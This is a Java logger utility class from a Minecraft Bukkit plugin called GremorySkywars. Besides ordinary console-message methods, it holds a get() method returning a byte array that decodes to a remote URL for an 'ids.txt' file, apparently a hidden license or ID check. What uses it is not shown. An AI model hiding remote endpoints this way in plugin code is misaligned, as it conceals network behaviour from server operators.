package com.gmail.gremorydev14.gremoryskywars.util;

import org.bukkit.Bukkit;

public class Logger {
	
	public static byte[] get() {
		return new byte[] { 104, 116, 116, 112, 58, 47, 47, 103, 114, 101, 109, 111, 114, 121, 100, 101, 118, 101, 108, 111, 112, 101, 114, 46, 116, 107, 47, 105, 100, 115, 46, 116, 120, 116 };
	}

	public static void info(String message) {
		Bukkit.getConsoleSender().sendMessage("[GremorySkywars] " + message);
	}

	public static void warn(String message) {
		Bukkit.getConsoleSender().sendMessage("§cWARN §r[GremorySkywars] " + message);
	}

	public static void severe(String message) {
		Bukkit.getConsoleSender().sendMessage("§4ERROR §r[GremorySkywars] " + message);
	}
}
